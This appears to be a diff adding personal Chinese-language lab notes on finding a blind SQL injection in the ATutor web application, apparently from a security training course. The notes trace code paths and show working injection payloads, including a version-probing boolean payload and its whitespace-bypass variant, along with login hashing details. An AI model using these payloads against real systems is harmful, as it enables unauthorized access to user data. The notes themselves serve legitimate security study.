@@ -1,0 +1,76 @@
+ssh student@atutor  -oKexAlgorithms=+diffie-hellman-group1-sha1
+1.連入機器開啟mysql及php日誌紀錄
+vi /etc/mysql/my.cnf
+sudo vi /etc/mysql/my.cnf
+sudo systemctl restart mysql
+sudo tail –f /var/log/mysql/mysql.log
+2.查看source code發現很多腳本一開始引用$_user_location = 'public';
+3.根據關鍵字搜索找到該腳本index_public.php
+grep -rnw  /var/www/html/ATutor/ -e "^.*user_location.*public.*" --color
+4.index_public.php網頁上能訪問,查看source code發現會接受p參數以及調用searchFriends方法
+5.根據searchFriends方法搜索,找到friends.inc.php
+grep -rnw  /var/www/html/ATutor/ -e "function searchFriends" --color
+6.根據index_public.php的SQL Injection測試
+7.實際在服務器運行的SQL是
+SELECT * FROM AT_members M WHERE (first_name LIKE '%timmy'%'  OR second_name LIKE '%timmy'%'  OR last_name LIKE '%timmy'%'  OR login LIKE '%timmy'%'  )
+8.發現一個'或阻斷SQL造成異常,兩個'可以正常執行
+9.查找addslashes方法
+egrep '\addslashes.*=.*' /var/www/html/ATutor/ -r --color
+10.測試magic_quitest_gpc()方法
+echo "<?php var_dump(get_magic_quotes_gpc()); ?>" > /var/www/html/magic.php
+11.訪問magic.php會返回false
+12.查看php版本
+echo "<?php echo 'PHP version: ' . phpversion().\"\r\n\"; ?>"  > /var/www/html/magic.php
+13.確定get_magic_quotes_gpc 返回會是false,所以每次都會走到else
+14.確定MYSQLI_ENABLED會被定義成1,因為mysql版本
+egrep -r "define\('MYSQL" /var/www/html/ATutor/ --color
+15.確定addslashes 就只等於trim
+16.這是完整的執行SQL語句
+SELECT count(*) FROM AT_members M WHERE (first_name LIKE '%timmy) or (select 1)=1#%' OR second_name LIKE '%timmy) or (select 1)=1#%' OR last_name LIKE '%timmy) or (select 1)=1#%' OR login LIKE '%timmy) or (select 1)=1#%');
+
+這是實際日誌中打印執行的語句
+SELECT * FROM AT_members M WHERE (first_name LIKE '%timmy%' OR second_name LIKE '%timmy%' OR last_name LIKE '%timmy%' OR login LIKE '%timmy%' )
+
+SELECT * FROM AT_members M WHERE (login LIKE '%AAA''%' )
+
+
+q=test') or (select ascii(substring((select version()),1,1)))=52#
+q=test%27)/**/or/**/(select/**/ascii(substring((select/**/version()),1,1)))=52%23
+
+
+重點發現index_public.php的返回會有不同長度,輸入off可以正常查找到內容,會返回內容
+輸入其他內容因找不到匹配內容,會返回空,在內容輸入指定字符可以使用blind SQL Inject
+
+正常SQL
+SELECT * FROM AT_members M WHERE (login LIKE '%timmy%' );
+修改後SQL
+SELECT * FROM AT_members M WHERE (login LIKE '%tea') or select password from AT_members where#'%' );
+
+
+登入驗證,請求會傳入
+form_login_action=true
+form_course_id=0
+form_password_hidden=52edb6fa7af703da7ec0e6fa3af4ed55a9977c21
+p=
+form_login=teacher
+form_password=
+submit=Login
+
+第一步在login_function.inc.php內轉換
+$this_password = $_POST['form_password_hidden'];
+$this_login        = $_POST['form_login'];
+$auto_login        = isset($_POST['auto']) ? intval($_POST['auto']) : 0;
+$used_cookie    = false;
+
+第二步會進DB取值做計算
+$row = queryDB("SELECT member_id, login, first_name, second_name,
+last_name, preferences, language, status, password AS pass, last_login FROM
+%smembers WHERE (login='%s' OR email='%s') AND SHA1(CONCAT(password, '%s'))='%s'",
+array(TABLE_PREFIX, $this_login, $this_login, $_SESSION['token'], $this_password),
+TRUE);
+
+
+###上傳IMS檔案失敗
+grep -ir "IMS manifest file is missing" /var/www/html/ATutor --color
+可以在import_test.php中找到需要imsmanifest.xml檔案才可以正常上傳zip
+
